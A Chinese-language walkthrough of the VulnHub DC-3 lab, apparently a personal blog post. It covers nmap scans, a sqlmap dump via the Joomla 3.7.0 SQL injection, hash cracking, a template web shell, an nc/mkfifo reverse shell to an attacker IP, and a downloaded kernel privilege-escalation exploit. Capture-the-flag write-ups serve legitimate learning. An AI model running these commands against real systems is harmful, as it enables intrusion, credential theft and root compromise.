---
# 这是页面的图标
icon: api
# 这是文章的标题
title: DC3-Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2021-09-24
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 靶机
comment: false
typora-root-url: ..\..\..\..\.vuepress\public

---

## 0x01 部署

靶机地址：

><https://www.vulnhub.com/entry/dc-3,312/>

**DESCRIPTION**

DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).

If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.

只有一个flag

## 0x02 信息收集

靶机使用virtual box部署，kali使用vmware部署，都为桥接模式

nmap扫描网段

```
nmap -sP 172.21.34.0/24
```

![image-20210924101423240](/assets/img/image-20210924101423240.png)

发现靶机IP：172.21.34.31，继续扫描

```
nmap -T5 -A -v -p- 172.21.34.31
```

结果：

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 10:04 CST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Initiating ARP Ping Scan at 10:04
Scanning 172.21.34.31 [1 port]
Completed ARP Ping Scan at 10:04, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:04
Completed Parallel DNS resolution of 1 host. at 10:04, 0.00s elapsed
Initiating SYN Stealth Scan at 10:04
Scanning 172.21.34.31 [65535 ports]
Discovered open port 80/tcp on 172.21.34.31
Completed SYN Stealth Scan at 10:04, 1.27s elapsed (65535 total ports)
Initiating Service scan at 10:04
Scanning 1 service on 172.21.34.31
Completed Service scan at 10:04, 11.06s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 172.21.34.31
NSE: Script scanning 172.21.34.31.
Initiating NSE at 10:04
Completed NSE at 10:04, 0.41s elapsed
Initiating NSE at 10:04
Completed NSE at 10:04, 0.04s elapsed
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Nmap scan report for 172.21.34.31
Host is up (0.00072s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
MAC Address: 08:00:27:2E:55:BC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.048 days (since Wed Mar 10 08:55:41 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 172.21.34.31

NSE: Script Post-scanning.
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Initiating NSE at 10:04
Completed NSE at 10:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.28 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

发现80端口，运行的Joomla

## 0x03 漏洞利用

使用msf查看Joomla版本为3.7.0

![image-20210924102654550](/assets/img/image-20210924102654550.png)

搜索Joomla 3.7.0版本漏洞

![image-20210924102850545](/assets/img/image-20210924102850545.png)

发现CVE-2017-8917 SQL注入漏洞： https://www.exploit-db.com/exploits/42033

上sqlmap

```txt
sqlmap -u "http://172.21.34.31/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T '#__users' -C username,password --dump
```

发现用户

![image-20210924103753282](/assets/img/image-20210924103753282.png)

使用john爆破，得到密码

![image-20210924104911090](/assets/img/image-20210924104911090.png)

在`http://172.21.34.31/administrator/index.php`登录，发现模板编辑功能，可以愉快的加马了，修改Beez3模板下index.php，加上一句话

![image-20210924111319969](/assets/img/image-20210924111319969.png)

修改完成后将Beez3模板设置为默认模板，使用蚁剑连接成功

![image-20210924111451058](/assets/img/image-20210924111451058.png)

![image-20210924111544587](/assets/img/image-20210924111544587.png)

先拿shell，kali上运行

```
nc -lvp 4444
```

因为靶机上是openbsd nc，不支持-e，所以使用以下命令反弹shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.134 4444 >/tmp/f
```

![image-20210924141311663](/assets/img/image-20210924141311663.png)

## 0x04 提权

查看当前目录下，未找到flag相关文件，考虑提权，根据ubuntu和内核版本搜索相关漏洞

```
searchsploit -w ubuntu 16.04 4.4
```

![image-20210924141536034](/assets/img/image-20210924141536034.png)

使用CVE-2016-4557：https://www.exploit-db.com/exploits/39772

kali下载EXP

```
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip  --no-check-certificate
```

启动web服务

```
python -m SimpleHTTPServer 8090
```

靶机下载，解压，编译运行

```
wget http://172.21.34.30:8090/39772.zip
unzip 39772.zip
cd 39772
tar xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
sh compile.sh
./doubleput
```

提权成功获得root权限，在`/root/`下发现flag文件，获得flag

![image-20210924142338904](/assets/img/image-20210924142338904.png)
